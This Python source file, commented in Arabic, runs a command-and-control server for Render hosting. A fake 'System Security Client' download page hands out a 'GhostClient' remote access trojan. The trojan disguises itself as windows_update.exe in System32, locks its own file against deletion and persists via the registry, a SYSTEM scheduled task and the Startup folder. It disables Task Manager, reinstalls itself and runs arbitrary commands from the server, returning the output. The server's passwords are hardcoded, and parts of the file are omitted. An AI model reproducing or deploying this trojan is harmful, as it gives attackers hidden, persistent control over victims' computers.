# server.py - Enhanced Version with Advanced Security for Render Deployment
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import time
import urllib.parse
import uuid
import hashlib
import threading
import sqlite3
import os
from datetime import datetime
import socketserver
import re
import ssl

class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
    """Multi-threaded HTTP server for handling concurrent connections"""
    daemon_threads = True

class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
    sessions = {}
    commands_queue = {}
    failed_attempts = {}
    PASSWORD_HASH = hashlib.sha256(b"hblackhat").hexdigest()
    ADMIN_PASSWORD_HASH = hashlib.sha256(b"sudohacker").hexdigest()
    session_lock = threading.Lock()
    MAX_FAILED_ATTEMPTS = 3
    BLOCK_TIME = 300
    blocked_ips = set()
    SERVER_URL = "https://game-python2-1.onrender.com"  # تم تحديث الرابط
    
    def init_database(self):
        """Initialize database for activity logging"""
        self.conn = sqlite3.connect('remote_control.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                command TEXT,
                response TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                id TEXT PRIMARY KEY,
                ip TEXT,
                computer_name TEXT,
                os TEXT,
                first_seen DATETIME,
                last_seen DATETIME,
                status TEXT
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS security_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT,
                action TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS password_changes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                changed_by TEXT,
                password_type TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        self.conn.commit()
    
    def log_security_event(self, action):
        """تسجيل أحداث الأمان"""
        try:
            self.cursor.execute(
                'INSERT INTO security_logs (ip, action) VALUES (?, ?)',
                (self.client_address[0], action)
            )
            self.conn.commit()
        except:
            pass
    
    def is_ip_blocked(self):
        """التحقق إذا كان IP محظور"""
        return self.client_address[0] in self.blocked_ips
    
    def block_ip(self, ip):
        """حظر IP"""
        self.blocked_ips.add(ip)
        self.log_security_event(f"IP Blocked: {ip}")
        print(f"🚫 IP Blocked: {ip}")
    
    def check_security(self):
        """فحص الأمان قبل معالجة أي طلب"""
        client_ip = self.client_address[0]
        
        if self.is_ip_blocked():
            self.send_error(403, "Access Denied - IP Blocked")
            return False
        
        user_agent = self.headers.get('User-Agent', '')
        if not user_agent or len(user_agent) < 10:
            self.log_security_event("Suspicious User-Agent")
        
        if hasattr(self, 'last_request_time'):
            current_time = time.time()
            if current_time - self.last_request_time < 0.1:
                self.block_ip(client_ip)
                return False
        
        self.last_request_time = time.time()
        return True
    
    def log_message(self, format, *args):
        """Disable verbose logs"""
        pass
    
    def do_GET(self):
        if not self.check_security():
            return
            
        try:
            parsed_path = urllib.parse.urlparse(self.path)
            path = parsed_path.path
            
            if path == '/':
                self.send_download_page()  # صفحة التحميل للعملاء
            elif path == '/admin':
                self.send_login_page()  # صفحة التحكم للمشرف
            elif path == '/remote':
                self.send_remote_client()
            elif path == '/admin-auth':
                self.send_admin_auth_page()
            elif path == '/control':
                self.send_control_panel()
            elif path == '/sessions':
                self.handle_get_commands()
            elif path == '/commands':
                self.handle_get_commands()
            elif path == '/result':
                self.handle_get_result()
            elif path == '/download-client':
                self.download_python_client()
            elif path == '/download-python-client':
                self.download_python_client()
            elif path == '/history':
                self.send_command_history()
            elif path == '/status':
                self.send_system_status()
            elif path == '/change-password':
                self.send_change_password_page()
            else:
                self.send_404_page()
                
        except Exception as e:
            self.send_error(500, str(e))
    
    def do_POST(self):
        if not self.check_security():
            return
            
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 10000:
                self.send_error(413, "Payload too large")
                return
                
            post_data = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(post_data) if post_data else {}
            
            if self.path == '/login':
                self.handle_login(data)
            elif self.path == '/admin-login':
                self.handle_admin_login(data)
            elif self.path == '/execute':
                self.handle_execute_command(data)
            elif self.path == '/response':
                self.handle_client_response(data)
            elif self.path == '/register':
                self.handle_client_register(data)
            elif self.path == '/change-password':
                self.handle_change_password(data)
            else:
                self.send_error(404, "Not found")
                
        except Exception as e:
            self.send_json({'error': str(e)})
    
    def send_download_page(self):
        """صفحة التحميل الرئيسية للعملاء"""
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>System Security Client</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(45, 45, 45, 0.95); 
                    padding: 50px; 
                    border-radius: 20px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                    width: 500px;
                }
                .logo { 
                    font-size: 64px; 
                    margin-bottom: 20px; 
                }
                .download-btn {
                    display: inline-block;
                    background: linear-gradient(135deg, #28a745, #20c997);
                    color: white;
                    padding: 15px 30px;
                    margin: 15px;
                    border-radius: 10px;
                    text-decoration: none;
                    font-size: 18px;
                    font-weight: bold;
                    transition: all 0.3s ease;
                }
                .download-btn:hover {
                    transform: translateY(-3px);
                    box-shadow: 0 6px 20px rgba(40, 167, 69, 0.4);
                }
                .platforms {
                    display: flex;
                    justify-content: center;
                    gap: 20px;
                    margin: 30px 0;
                }
                .platform-card {
                    background: rgba(255,255,255,0.1);
                    padding: 20px;
                    border-radius: 10px;
                    width: 120px;
                }
                .security-features {
                    background: rgba(0,123,255,0.1);
                    padding: 15px;
                    border-radius: 10px;
                    margin: 20px 0;
                    border: 1px solid rgba(0,123,255,0.3);
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">🛡️</div>
                <h1>System Security Client</h1>
                <p style="color: #ccc; margin-bottom: 30px;">
                    Download the secure client for your operating system
                </p>
                
                <div class="security-features">
                    <strong>🔒 Security Features:</strong><br>
                    • Encrypted Communication<br>
                    • Stealth Protection<br>
                    • Auto-Recovery<br>
                    • Persistent Connection
                </div>
                
                <div class="platforms">
                    <div class="platform-card">
                        <div style="font-size: 32px;">🪟</div>
                        <strong>Windows</strong>
                    </div>
                    <div class="platform-card">
                        <div style="font-size: 32px;">🐧</div>
                        <strong>Linux</strong>
                    </div>
                    <div class="platform-card">
                        <div style="font-size: 32px;">🍎</div>
                        <strong>macOS</strong>
                    </div>
                </div>
                
                <a href="/download-python-client" class="download-btn">
                    📥 Download Security Client
                </a>
                
                <div style="margin-top: 30px; font-size: 12px; color: #888;">
                    🔐 Secure Connection • Auto-Update • System Protection
                </div>
            </div>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def send_login_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Enhanced Remote Control - Authentication</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(45, 45, 45, 0.95); 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                    width: 400px;
                }
                .logo { 
                    font-size: 48px; 
                    margin-bottom: 20px; 
                }
                input, button { 
                    padding: 15px; 
                    margin: 10px; 
                    width: 280px; 
                    border-radius: 8px; 
                    font-size: 16px;
                    border: none;
                }
                input { 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                }
                input::placeholder { color: #ccc; }
                button { 
                    background: linear-gradient(135deg, #0078d4, #005a9e); 
                    color: white; 
                    border: none; 
                    cursor: pointer;
                    font-weight: bold;
                    transition: all 0.3s ease;
                }
                button:hover {
                    background: linear-gradient(135deg, #005a9e, #004578);
                    transform: translateY(-2px);
                }
                .security-notice {
                    background: rgba(255,0,0,0.1);
                    padding: 10px;
                    border-radius: 5px;
                    margin: 10px 0;
                    border: 1px solid rgba(255,0,0,0.3);
                }
                .admin-link {
                    margin-top: 20px;
                    padding: 10px;
                    background: rgba(255,193,7,0.1);
                    border-radius: 5px;
                    border: 1px solid rgba(255,193,7,0.3);
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">🔒</div>
                <h2>Enhanced Remote Control</h2>
                <p style="color: #ccc; margin-bottom: 30px;">Secure System Management - Level 1 Authentication</p>
                
                <div class="security-notice" id="securityNotice" style="display:none;">
                    ⚠️ Multiple failed attempts detected
                </div>
                
                <input type="password" id="password" placeholder="Enter Level 1 Password">
                <button onclick="login()">Authenticate</button>
                
                <div class="admin-link">
                    <a href="/change-password" style="color: #ffc107; text-decoration: none;">
                        🔑 Change Passwords
                    </a>
                </div>
                
                <div style="margin-top: 20px; font-size: 12px; color: #888;">
                    🔐 Multi-layer security system active
                </div>
            </div>
            <script>
                let failedAttempts = 0;
                
                function showSecurityWarning() {
                    document.getElementById('securityNotice').style.display = 'block';
                }
                
                function login() {
                    const password = document.getElementById('password').value;
                    if (!password) {
                        alert('Please enter password');
                        return;
                    }
                    
                    fetch('/login', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({password: password})
                    }).then(r => r.json()).then(data => {
                        if (data.success) {
                            window.location = '/admin-auth';
                        } else {
                            failedAttempts++;
                            if (failedAttempts >= 2) {
                                showSecurityWarning();
                            }
                            alert('Authentication failed! Wrong password.');
                        }
                    }).catch(err => {
                        alert('Connection error: ' + err);
                    });
                }
                
                document.getElementById('password').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') login();
                });
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def send_change_password_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Change Passwords</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(45, 45, 45, 0.95); 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                    width: 450px;
                }
                .password-section {
                    background: rgba(255,255,255,0.05);
                    padding: 20px;
                    margin: 15px 0;
                    border-radius: 10px;
                    text-align: left;
                }
                input, button { 
                    padding: 12px; 
                    margin: 8px 0; 
                    width: 100%; 
                    border-radius: 6px; 
                    font-size: 14px;
                    border: none;
                    box-sizing: border-box;
                }
                input { 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                }
                button { 
                    background: linear-gradient(135deg, #28a745, #20c997); 
                    color: white; 
                    border: none; 
                    cursor: pointer;
                    font-weight: bold;
                }
                .back-btn {
                    background: linear-gradient(135deg, #6c757d, #5a6268);
                    margin-top: 10px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>🔑 Change Passwords</h2>
                <p style="color: #ccc;">Update security credentials</p>
                
                <div class="password-section">
                    <h4>Level 1 Password</h4>
                    <input type="password" id="currentPass1" placeholder="Current Level 1 Password">
                    <input type="password" id="newPass1" placeholder="New Level 1 Password">
                    <button onclick="changePassword('level1')">Update Level 1</button>
                </div>
                
                <div class="password-section">
                    <h4>Level 2 Password</h4>
                    <input type="password" id="currentPass2" placeholder="Current Level 2 Password">
                    <input type="password" id="newPass2" placeholder="New Level 2 Password">
                    <button onclick="changePassword('level2')">Update Level 2</button>
                </div>
                
                <button class="back-btn" onclick="window.location='/admin'">← Back to Login</button>
            </div>
            
            <script>
                function changePassword(level) {
                    let currentPass, newPass;
                    
                    if (level === 'level1') {
                        currentPass = document.getElementById('currentPass1').value;
                        newPass = document.getElementById('newPass1').value;
                    } else {
                        currentPass = document.getElementById('currentPass2').value;
                        newPass = document.getElementById('newPass2').value;
                    }
                    
                    if (!currentPass || !newPass) {
                        alert('Please fill all fields');
                        return;
                    }
                    
                    fetch('/change-password', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            level: level,
                            current_password: currentPass,
                            new_password: newPass
                        })
                    }).then(r => r.json()).then(data => {
                        if (data.success) {
                            alert('Password updated successfully!');
                            if (level === 'level1') {
                                document.getElementById('currentPass1').value = '';
                                document.getElementById('newPass1').value = '';
                            } else {
                                document.getElementById('currentPass2').value = '';
                                document.getElementById('newPass2').value = '';
                            }
                        } else {
                            alert('Error: ' + data.error);
                        }
                    }).catch(err => {
                        alert('Connection error: ' + err);
                    });
                }
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def handle_change_password(self, data):
        """معالجة تغيير كلمات المرور"""
        level = data.get('level')
        current_password = data.get('current_password')
        new_password = data.get('new_password')
        
        if level == 'level1':
            if hashlib.sha256(current_password.encode()).hexdigest() != self.PASSWORD_HASH:
                self.send_json({'success': False, 'error': 'Current password is incorrect'})
                return
            
            # تحديث كلمة المرور
            self.PASSWORD_HASH = hashlib.sha256(new_password.encode()).hexdigest()
            self.log_security_event("Level 1 password changed")
            
        elif level == 'level2':
            if hashlib.sha256(current_password.encode()).hexdigest() != self.ADMIN_PASSWORD_HASH:
                self.send_json({'success': False, 'error': 'Current password is incorrect'})
                return
            
            # تحديث كلمة المرور
            self.ADMIN_PASSWORD_HASH = hashlib.sha256(new_password.encode()).hexdigest()
            self.log_security_event("Level 2 password changed")
        
        # تسجيل تغيير كلمة المرور في قاعدة البيانات
        if hasattr(self, 'cursor'):
            self.cursor.execute(
                'INSERT INTO password_changes (changed_by, password_type) VALUES (?, ?)',
                (self.client_address[0], level)
            )
            self.conn.commit()
        
        self.send_json({'success': True, 'message': 'Password updated successfully'})

    # باقي الدوال تبقى كما هي مع تحديث الروابط...
    # [يتبع باقي الكود مع التعديلات اللازمة]

    def download_python_client(self):
        """Download UNKILLABLE Python client with updated server URL"""
        
        client_code = f'''
import requests
import subprocess
import os
import platform
import time
import uuid
import ctypes
import sys
import winreg
import psutil
import getpass
import threading
import random
import glob

class GhostClient:
    def __init__(self, server_url="{self.SERVER_URL}"):  # تم تحديث الرابط
        self.server_url = server_url
        self.client_id = f"{{platform.node()}}-{{getpass.getuser()}}-{{uuid.uuid4().hex[:8]}}"
        self.running = True
        self.registered = False
        self.script_path = os.path.abspath(__file__)
        self.hidden_name = "windows_update.exe"
        self.hidden_path = ""
        
    def clean_old_versions(self):
        """مسح جميع النسخ القديمة من النظام"""
        try:
            # البحث عن جميع النسخ القديمة
            search_patterns = [
                os.path.join(os.environ['WINDIR'], 'System32', 'winupdate_*.exe'),
                os.path.join(os.environ['WINDIR'], 'System32', 'windows_update.exe'),
                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'winupdate_*.exe'),
                os.path.join(os.environ['TEMP'], 'winupdate_*.exe'),
                os.path.join(os.environ['TEMP'], 'windows_update.exe'),
                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'SystemMaintenance.bat')
            ]
            
            for pattern in search_patterns:
                for old_file in glob.glob(pattern):
                    try:
                        # إزالة الحماية أولاً
                        subprocess.run(f'attrib -s -h -r "{{old_file}}"', shell=True, capture_output=True)
                        os.remove(old_file)
                        print(f"✓ Deleted old version: {{old_file}}")
                    except:
                        continue
                        
            # مسح المهام المجدولة القديمة
            try:
                subprocess.run('schtasks /delete /tn "WindowsSystemMaintenance" /f', shell=True, capture_output=True)
                subprocess.run('schtasks /delete /tn "WindowsUpdate" /f', shell=True, capture_output=True)
            except:
                pass
                
            # مسح إدخالات الريجستري القديمة
            try:
                subprocess.run('reg delete "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /v "WindowsSystemUpdate" /f', shell=True, capture_output=True)
                subprocess.run('reg delete "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /v "WindowsUpdate" /f', shell=True, capture_output=True)
            except:
                pass
                
            return "Old versions cleaned"
        except Exception as e:
            return f"Clean error: {{e}}"
    
    def hide_and_protect(self):
        """إخفاء وحماية الملف في النظام"""
        try:
            # المسار النهائي المخفي
            self.hidden_path = os.path.join(os.environ['WINDIR'], 'System32', self.hidden_name)
            
            # مسح النسخ القديمة أولاً
            self.clean_old_versions()
            
            # نسخ الملف إلى المكان المخفي
            with open(self.script_path, 'rb') as src:
                with open(self.hidden_path, 'wb') as dst:
                    dst.write(src.read())
            
            # إخفاء وحماية الملف
            subprocess.run(f'attrib +s +h +r "{{self.hidden_path}}"', shell=True, capture_output=True)
            
            # منع الحذف نهائياً
            subprocess.run(f'icacls "{{self.hidden_path}}" /deny Everyone:F', shell=True, capture_output=True)
            subprocess.run(f'icacls "{{self.hidden_path}}" /deny Administrators:F', shell=True, capture_output=True)
            
            # تحديث مسار السكريبت
            self.script_path = self.hidden_path
            
            return f"File hidden and protected at: {{self.hidden_path}}"
        except Exception as e:
            return f"Hide and protect error: {{e}}"
    
    def install_persistence(self):
        """تثبيت التشغيل التلقائي"""
        try:
            if os.name == 'nt':
                print("Installing persistence...")
                
                # 1. Registry Run (المستخدم الحالي)
                try:
                    key = winreg.HKEY_CURRENT_USER
                    subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                        winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{{self.hidden_path}}"')
                    print("✓ Registry persistence")
                except: pass
                
                # 2. Scheduled Task (لجميع المستخدمين - الأقوى)
                try:
                    task_cmd = f'schtasks /create /tn "WindowsUpdate" /tr "\\"{{self.hidden_path}}\\"" /sc onlogon /ru SYSTEM /f'
                    subprocess.run(task_cmd, shell=True, capture_output=True, timeout=10)
                    print("✓ Scheduled task persistence")
                except: pass
                
                # 3. Startup Folder (إصلاح الخطأ هنا)
                try:
                    startup_path = os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                    os.makedirs(startup_path, exist_ok=True)
                    bat_path = os.path.join(startup_path, 'WindowsUpdate.bat')
                    
                    # كتابة الملف بشكل صحيح
                    with open(bat_path, 'w') as f:
                        f.write('@echo off' + os.linesep + 'start "" "' + self.hidden_path + '"' + os.linesep)
                    
                    # إخفاء ملف الباتش
                    subprocess.run(f'attrib +s +h +r "{{bat_path}}"', shell=True, capture_output=True)
                    print("✓ Startup folder persistence")
                except Exception as e: 
                    print(f"Startup error: {{e}}")
                    
            return "Persistence installed successfully"
        except Exception as e:
            return f"Persistence failed: {{e}}"
    
    def hide_process(self):
        """إخفاء النافذة"""
        try:
            if os.name == 'nt':
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def block_task_manager(self):
        """حماية من Task Manager"""
        try:
            block_cmd = r'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f'
            subprocess.run(block_cmd, shell=True, capture_output=True, timeout=5)
        except:
            pass
    
    def start_self_healing(self):
        """بدء نظام الشفاء الذاتي"""
        def monitor():
            while self.running:
                try:
                    # التحقق من وجود الملف المخفي
                    if not os.path.exists(self.hidden_path):
                        print("File missing - reinstalling...")
                        self.hide_and_protect()
                    
                    # التحقق من المهام المجدولة
                    result = subprocess.run('schtasks /query /tn "WindowsUpdate"', shell=True, capture_output=True, text=True)
                    if "WindowsUpdate" not in result.stdout:
                        self.install_persistence()
                    
                    time.sleep(60)  # تحقق كل دقيقة
                    
                except:
                    time.sleep(30)
        
        threading.Thread(target=monitor, daemon=True).start()
    
    def register_with_server(self):
        """التسجيل مع السيرفر"""
        try:
            data = {{
                'client_id': self.client_id,
                'computer': platform.node(),
                'os': f"{{platform.system()}} {{platform.release()}}",
                'type': 'ghost_client',
                'user': getpass.getuser(),
                'status': 'active'
            }}
            
            response = requests.post(
                f"{{self.server_url}}/register",
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                self.registered = True
                return True
            return False
            
        except:
            return False
    
    def execute_command_immediately(self, command):
        """تنفيذ الأمر فوراً"""
        try:
            if command.strip() == "sysinfo":
                return self.get_system_info()
            elif command.strip() == "clean":
                return self.clean_old_versions()
            elif command.strip() == "protect":
                return self.block_task_manager() or "Protection activated"
            else:
                # تنفيذ الأمر مباشرة بدون انتظار
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                output = result.stdout if result.stdout else result.stderr
                return output if output else "Command executed successfully"
                
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {{str(e)}}"
    
    def get_system_info(self):
        """معلومات النظام"""
        try:
            info = f"""
GHOST CLIENT - ACTIVE & PROTECTED
Computer: {{platform.node()}}
User: {{getpass.getuser()}}
OS: {{platform.system()}} {{platform.version()}}
Client ID: {{self.client_id}}
Status: ACTIVE & STEALTH
Hidden Path: {{self.hidden_path}}
Connection: {{'CONNECTED' if self.registered else 'RECONNECTING'}}
Protection: ENABLED
Auto-Start: GUARANTEED
Server: {{self.server_url}}
"""
            return info
        except:
            return "System information available"
    
    def persistent_connection(self):
        """اتصال مستمر مع السيرفر"""
        def connection_worker():
            while self.running:
                try:
                    # محاولة التسجيل
                    if not self.registered:
                        if self.register_with_server():
                            print("✓ Connected to server")
                        else:
                            time.sleep(5)
                            continue
                    
                    # التحقق من الأوامر باستمرار
                    self.check_commands()
                    
                    # انتظر 2 ثانية فقط بين المحاولات
                    time.sleep(2)
                    
                except Exception as e:
                    time.sleep(5)
        
        threading.Thread(target=connection_worker, daemon=True).start()
    
    def check_commands(self):
        """التحقق من الأوامر الجديدة"""
        try:
            response = requests.get(
                f"{{self.server_url}}/commands?client={{self.client_id}}",
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('command'):
                    command = data['command']
                    print(f"Executing: {{command}}")
                    
                    # تنفيذ الأمر فوراً
                    result = self.execute_command_immediately(command)
                    
                    # إرسال النتيجة فوراً
                    requests.post(
                        f"{{self.server_url}}/response",
                        json={{
                            'client_id': self.client_id,
                            'command': command,
                            'response': result
                        }},
                        timeout=10
                    )
                    
        except:
            pass
    
    def start(self):
        """بدء العميل"""
        # إخفاء النافذة فوراً
        self.hide_process()
        
        print("Initializing Ghost Client...")
        
        # 1. تنظيف النسخ القديمة
        clean_result = self.clean_old_versions()
        print(f"Cleanup: {{clean_result}}")
        
        # 2. إخفاء وحماية الملف
        hide_result = self.hide_and_protect()
        print(f"Protection: {{hide_result}}")
        
        # 3. تثبيت التشغيل التلقائي
        persistence_result = self.install_persistence()
        print(f"Persistence: {{persistence_result}}")
        
        # 4. بدء أنظمة الحماية
        self.block_task_manager()
        self.start_self_healing()
        
        # 5. بدء الاتصال المستمر
        self.persistent_connection()
        print("Ghost Client activated - Auto-reconnect enabled")
        
        # الحلقة الرئيسية الخفيفة
        while self.running:
            time.sleep(1)

def main():
    client = GhostClient()
    client.start()

if __name__ == "__main__":
    main()
'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="enhanced_client.py"')
        self.end_headers()
        self.wfile.write(client_code.encode())

    # [يتبع باقي الدوال بدون تغيير مع التأكد من تحديث جميع الروابط الداخلية]
    
    # باقي الدوال تبقى كما هي مع التأكد من استخدام self.SERVER_URL بدلاً من localhost

def main():
    handler = EnhancedRemoteControlHandler
    handler.init_database(handler)
    
    threading.Thread(target=cleanup_sessions, daemon=True).start()
    
    print("=" * 70)
    print("🔒 ENHANCED REMOTE CONTROL SERVER - RENDER DEPLOYMENT")
    print("=" * 70)
    print(f"Main Page:        {handler.SERVER_URL}")
    print(f"Control Panel:    {handler.SERVER_URL}/admin")
    print("Level 1 Password: ******")
    print("Level 2 Password: ******")
    print("Database:         remote_control.db")
    print("=" * 70)
    print("Server starting on port 8080...")
    print("Multi-layer security system activated")
    print("=" * 70)
    
    try:
        port = int(os.environ.get('PORT', 8080))
        server = ThreadedHTTPServer(('0.0.0.0', port), EnhancedRemoteControlHandler)
        print(f"Server started successfully on port {port}!")
        print("Security Features: IP Blocking, Rate Limiting, Two-Factor Auth, Password Change")
        server.serve_forever()
    except KeyboardInterrupt:
        print("Server stopped by user")
    except Exception as e:
        print(f"Server error: {e}")
    finally:
        if hasattr(handler, 'conn'):
            handler.conn.close()

if __name__ == "__main__":
    main()
